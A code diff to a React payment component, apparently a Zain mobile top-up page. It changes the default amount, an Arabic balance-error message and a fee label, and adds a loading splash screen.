@@ -15,7 +15,7 @@ export default function ZainPayment() {
   const [isSubmitted, setIsSubmitted] = useState(false)
   const [loading, setIsLoading] = useState(true)
   const [showAmountDropdown, setShowAmountDropdown] = useState(false)
-  const [selectedAmount, setSelectedAmount] = useState("30.00")
+  const [selectedAmount, setSelectedAmount] = useState("29.900")
   const [otherAmount, setOtherAmount] = useState("0")
   const [fees, setFees] = useState("-0.600")
   const [total, setTotal] = useState("0.000")
@@ -55,7 +55,7 @@ export default function ZainPayment() {
       }
     } catch (error) {
       console.error("Failed to fetch balance:", error)
-      setBalanceError("لايوجد لديك رصيد يرجى شحن خطك.")
+      setBalanceError("فشل في جلب معلومات الرصيد. يرجى المحاولة مرة أخرى.")
     } finally {
       setIsLoadingBalance(false)
     }
@@ -397,7 +397,7 @@ export default function ZainPayment() {
             
             <div className="flex justify-between items-center pb-2">
               <div className="text-gray-700">{fees} د.ك</div>
-              <div className="text-gray-700">خصم الرسوم </div>
+              <div className="text-gray-700">الرسوم</div>
             </div>
             
             <div className="flex justify-between items-center pt-3 border-t border-dashed">
@@ -442,6 +442,7 @@ export default function ZainPayment() {
         </div>
       </div>
 
+      {loading && <SplashScreen />}
     </div>
   )
 }
